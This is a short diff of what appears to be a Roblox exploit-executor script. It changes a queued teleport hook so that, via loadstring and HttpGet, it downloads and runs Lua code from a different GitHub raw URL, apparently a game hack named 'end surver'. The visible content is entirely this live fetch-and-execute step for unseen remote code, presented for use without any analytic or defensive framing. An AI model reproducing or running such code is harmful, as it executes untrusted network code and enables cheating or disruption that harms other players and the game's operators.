@@ -46,6 +46,6 @@ end
 end
 syn.queue_on_teleport(
     [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/PeaPattern/Tall-Man-Run/main/hacked.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KillstreakSEX/balls/main/end%20surver.txt"))()
     ]]
 )
